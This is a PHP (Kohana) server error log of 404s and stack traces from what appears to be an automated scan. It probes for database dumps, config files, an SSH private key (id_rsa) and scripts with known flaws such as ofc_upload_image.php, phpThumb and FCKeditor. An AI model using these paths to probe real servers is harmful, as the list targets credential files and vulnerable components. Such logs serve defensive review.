2025-10-29 19:27:41 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34-database.sql.tar ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:41 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34_dump.sql.tar ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:41 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34_dump.sql.tar ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:41 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34-dump.sql.tar ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:41 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34-dump.sql.tar ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:41 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34_backup.sql.tar ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:41 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34_backup.sql.tar ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:41 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34-backup.sql.tar ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:41 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34-backup.sql.tar ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:41 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: history/historyFrame.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:41 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: history/historyFrame.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:41 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: project.xml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:41 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: project.xml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:41 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: sitemap.xml"913267@ ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:41 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: sitemap.xml"913267@ ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:41 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: backup-34.sql.tar ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:41 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: backup-34.sql.tar ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: kO2uwHSf.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: kO2uwHSf.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: scripts/history/historyFrame.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: scripts/history/historyFrame.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL 2GHmtzw5 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL 2GHmtzw5 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: backup_34.sql.tar ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: backup_34.sql.tar ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: db.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: db.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: Flex/history/historyFrame.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: Flex/history/historyFrame.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL id_rsa was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL id_rsa was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: contrib/extjs/examples/feed-viewer/feed-proxy.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: contrib/extjs/examples/feed-viewer/feed-proxy.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL ckeditor was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL ckeditor was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: wp-content/themes/twentyfifteen/genericons/example.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: wp-content/themes/twentyfifteen/genericons/example.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: extjs/examples/feed-viewer/feed-proxy.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: extjs/examples/feed-viewer/feed-proxy.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34.28.184.113.sql.tar ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34.28.184.113.sql.tar ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: db.inc ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: db.inc ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL admin/ckeditor was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL admin/ckeditor was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: wp-content/plugins/jetpack/_inc/genericons/genericons/example.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: wp-content/plugins/jetpack/_inc/genericons/genericons/example.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: js/extjs/examples/feed-viewer/feed-proxy.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: js/extjs/examples/feed-viewer/feed-proxy.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: conf.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: conf.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: min/index.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: min/index.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34.28.184.113-dump.sql.tar ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34.28.184.113-dump.sql.tar ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: lib/js/extjs/examples/feed-viewer/feed-proxy.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: lib/js/extjs/examples/feed-viewer/feed-proxy.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: includes/ofc/php/ofc_upload_image.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: includes/ofc/php/ofc_upload_image.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL Zgcg3Sz8 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL Zgcg3Sz8 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: conf.inc ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: conf.inc ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34.28.184.113-backup.sql.tar ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34.28.184.113-backup.sql.tar ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: minify/min/index.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: minify/min/index.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: sitemap.xml" ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: sitemap.xml" ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cms/plugins/content/jthumbs/includes/phpThumb.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cms/plugins/content/jthumbs/includes/phpThumb.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: libs/js/extjs/examples/feed-viewer/feed-proxy.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: libs/js/extjs/examples/feed-viewer/feed-proxy.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34.28.184.113_db.sql.tar ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34.28.184.113_db.sql.tar ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: html/includes/ofc/php/ofc_upload_image.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: html/includes/ofc/php/ofc_upload_image.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: common/scripts/phpThumb/phpThumb.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: common/scripts/phpThumb/phpThumb.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: sitemap.xml" ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: sitemap.xml" ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: db.zip ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: db.zip ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: include/js/extjs/examples/feed-viewer/feed-proxy.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: include/js/extjs/examples/feed-viewer/feed-proxy.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: core/lib/php-ofc-library/ofc_upload_image.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: core/lib/php-ofc-library/ofc_upload_image.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpThumb/phpThumb.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpThumb/phpThumb.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: libs/open-flash-chart/php-ofc-library/ofc_upload_image.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: libs/open-flash-chart/php-ofc-library/ofc_upload_image.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: sitemap.xml" ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: sitemap.xml" ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: lib/extjs/examples/feed-viewer/feed-proxy.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: lib/extjs/examples/feed-viewer/feed-proxy.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: libs/phpThumb/phpThumb.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: libs/phpThumb/phpThumb.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: settings.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: settings.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: create.zip ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: create.zip ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL FCKeditor was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL FCKeditor was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: application/libraries/ofc-library/ofc_upload_image.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: application/libraries/ofc-library/ofc_upload_image.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: libs/extjs/examples/feed-viewer/feed-proxy.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: libs/extjs/examples/feed-viewer/feed-proxy.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: gallery/phpThumb/phpThumb.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: gallery/phpThumb/phpThumb.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: settings.inc ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: settings.inc ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: ${dirname}.sublime-workspace ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: ${dirname}.sublime-workspace ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL fckeditor was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL fckeditor was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: dump.zip ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: dump.zip ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: piwik/libs/open-flash-chart/php-ofc-library/ofc_upload_image.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: piwik/libs/open-flash-chart/php-ofc-library/ofc_upload_image.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: js/tiny_mce/plugins/ibrowser/scripts/phpThumb/phpThumb.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: js/tiny_mce/plugins/ibrowser/scripts/phpThumb/phpThumb.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: include/extjs/examples/feed-viewer/feed-proxy.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: include/extjs/examples/feed-viewer/feed-proxy.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: config.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: config.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
